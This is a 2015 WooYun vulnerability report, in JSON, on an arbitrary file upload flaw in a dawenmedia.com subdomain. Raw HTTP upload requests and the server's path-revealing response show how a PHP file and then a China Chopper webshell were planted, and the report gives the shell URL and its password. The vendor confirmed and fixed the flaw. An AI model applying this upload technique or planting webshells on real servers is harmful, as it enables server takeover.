{"id": 36862, "wybug_id": "wooyun-2015-0100958", "wybug_title": "达闻传媒某分站任意上传可导致服务器沦陷", "wybug_corp": "dawenmedia.com", "wybug_author": "❤", "wybug_date": "2015-03-12 18:00", "wybug_open_date": "2015-04-26 18:02", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-26：\t细节向公众公开  简要描述： * 详细说明：  今天看wooyun发现新来的厂商就谷歌了一下。发现一处上传：\nhttp://wx.api.dawenmedia.com/wxdw/register/bride\n然后尝试上传上传截图数据如下：\nPOST /wxdw/upload/save HTTP/1.1Host: wx.api.dawenmedia.comProxy-Connection: keep-aliveContent-Length: 195Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://wx.api.dawenmedia.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5YWHdlXH7ttQHDmKReferer: http://wx.api.dawenmedia.com/wxdw/register/brideAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: pgv_pvi=6309179392; pgv_si=s4291216384; pgv_info=ssid=s8697179060; ts_last=wx.api.dawenmedia.com/wxdw/jinkevote; ts_refer=s.bt.gg/; pgv_pvid=1644849566; ts_uid=3873108425; Hm_lvt_a0247029c8f03c1ce89b8e3a2fb49b9e=1426149106; Hm_lpvt_a0247029c8f03c1ce89b8e3a2fb49b9e=1426149106------WebKitFormBoundary5YWHdlXH7ttQHDmKContent-Disposition: form-data; name=\"myData\"; filename=\"test.jpg\"Content-Type: image/jpegtest wooyun------WebKitFormBoundary5YWHdlXH7ttQHDmK--\n修改下类型为：\nPOST /wxdw/upload/save HTTP/1.1Host: wx.api.dawenmedia.comProxy-Connection: keep-aliveContent-Length: 195Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://wx.api.dawenmedia.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5YWHdlXH7ttQHDmKReferer: http://wx.api.dawenmedia.com/wxdw/register/brideAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: pgv_pvi=6309179392; pgv_si=s4291216384; pgv_info=ssid=s8697179060; ts_last=wx.api.dawenmedia.com/wxdw/jinkevote; ts_refer=s.bt.gg/; pgv_pvid=1644849566; ts_uid=3873108425; Hm_lvt_a0247029c8f03c1ce89b8e3a2fb49b9e=1426149106; Hm_lpvt_a0247029c8f03c1ce89b8e3a2fb49b9e=1426149106------WebKitFormBoundary5YWHdlXH7ttQHDmKContent-Disposition: form-data; name=\"myData\"; filename=\"test.txt\"Content-Type: txt/txttest wooyun------WebKitFormBoundary5YWHdlXH7ttQHDmK--\n尝试上传文本，返回得到：\nHTTP/1.1 200 OKContent-Type: text/htmlVary: Accept-EncodingServer: Microsoft-IIS/7.5Date: Thu, 12 Mar 2015 08:40:17 GMTContent-Length: 123{\"url\":\"attachment\\/2015\\/03\\/20150312164017480509.txt\",\"url_thumb\":\"attachment\\/2015\\/03\\/20150312164017480509_thumb.txt\"}\n构造路径为：\nhttp://wx.api.dawenmedia.com/wxdw/attachment/2015/03/20150312164017480509.txt\n然后修改为PHP得到路径为：\nhttp://wx.api.dawenmedia.com/wxdw/attachment/2015/03/20150312162755649840.php\n然后上传PHP菜刀一句话：得到URL：\nhttp://wx.api.dawenmedia.com/wxdw/attachment/2015/03/20150312162934728860.php\n密码pass\n\n服务器为2008系统的服务器\n\n终端端口是33669 到这里了，就不上提权工具提权了。到此为止吧。   漏洞证明：     修复方案：  *   版权声明：转载请注明来源 ❤@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-03-12 20:18 厂商回复： 已处理，危害挺严重的。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}